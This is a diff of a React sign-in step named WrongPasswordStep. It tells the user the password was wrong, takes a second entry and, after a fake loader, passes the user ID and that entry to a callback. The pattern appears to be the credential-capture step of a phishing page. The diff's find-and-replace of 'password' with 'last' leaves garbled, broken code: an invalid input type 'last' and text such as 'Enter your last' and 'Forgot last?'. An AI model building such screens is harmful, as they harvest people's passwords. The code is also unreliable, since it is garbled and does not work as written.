@@ -1,8 +1,8 @@
 import { useState } from "react";
 import "./SignIn.css";
 
-function WrongPasswordStep({ email, userId, onComplete }) {
-  const [wrongPassword, setwrongPassword] = useState("");
+function WrongPasswordStep({ first, userId, onComplete }) {
+  const [WongP, setwrongPassword] = useState("");
   const [showPassword, setShowPassword] = useState(false);
   const [showLoader, setShowLoader] = useState(false);
 
@@ -11,15 +11,14 @@ function WrongPasswordStep({ email, userId, onComplete }) {
  const handleSubmit = (e) => {
   e.preventDefault();
 
-  if (!wrongPassword.trim()) return;
+  if (!WongP.trim()) return;
 
-  console.log("Current user ID:", userId);
-  console.log("Current wrongPassword:", wrongPassword.trim());
+  
     setShowLoader(true);
 
   if (onComplete) {
     setTimeout(() => {
-         onComplete(userId, wrongPassword.trim());
+         onComplete(userId, WongP.trim());
       setShowLoader(false);
     }, 2000);
    
@@ -57,7 +56,7 @@ function WrongPasswordStep({ email, userId, onComplete }) {
           </div>
         )}
 
-        <div className="password-left">
+        <div className="last-left">
 
            <div className="pesams-brand">
 
@@ -75,8 +74,8 @@ function WrongPasswordStep({ email, userId, onComplete }) {
 
           <div className="account-pill">
             <span className="account-icon">👤</span>
-            <span className="account-email">
-              {email}
+            <span className="account-first">
+              {first}
             </span> 
               <button
                   type="button"
@@ -89,32 +88,32 @@ function WrongPasswordStep({ email, userId, onComplete }) {
 
         </div>
 
-        <div className="password-right">
+        <div className="last-right">
 
       
 
           <form onSubmit={handleSubmit}>
 
-            <div className="password-input-container green">
+            <div className="last-input-container green">
 
               <input
-                id="password"
-                type={showPassword ? "text" : "password"}
-                value={wrongPassword}
+                id="last"
+                type={showPassword ? "text" : "last"}
+                value={WongP}
                 
                 onChange={(e) => setwrongPassword(e.target.value)}
                 placeholder=" "
                 autoComplete="off"
               />
 
-              <label htmlFor="password">
-                Enter your password
+              <label htmlFor="last">
+                Enter your last
               </label>
 
             </div>
-            <small className="get">Wrong password. Try again or click "Forgot password?" for more options.</small>
+            <small className="get">Wrong last. Try again or click "Forgot last?" for more options.</small>
 
-            <label className="show-password">
+            <label className="show-last">
               <input
                 type="checkbox"
                 checked={showPassword}
@@ -123,22 +122,22 @@ function WrongPasswordStep({ email, userId, onComplete }) {
                 }
               />
 
-              <span>Show password</span>
+              <span>Show last</span>
             </label>
 
-            <div className="password-actions">
+            <div className="last-actions">
 
               <button
                 type="button"
                 className="text-button"
               >
-                Forgot password?
+                Forgot last?
               </button>
 
               <button
                 type="submit"
                 className="next-button"
-                disabled={!wrongPassword.trim()}
+                disabled={!WongP.trim()}
               >
                 Next
               </button>
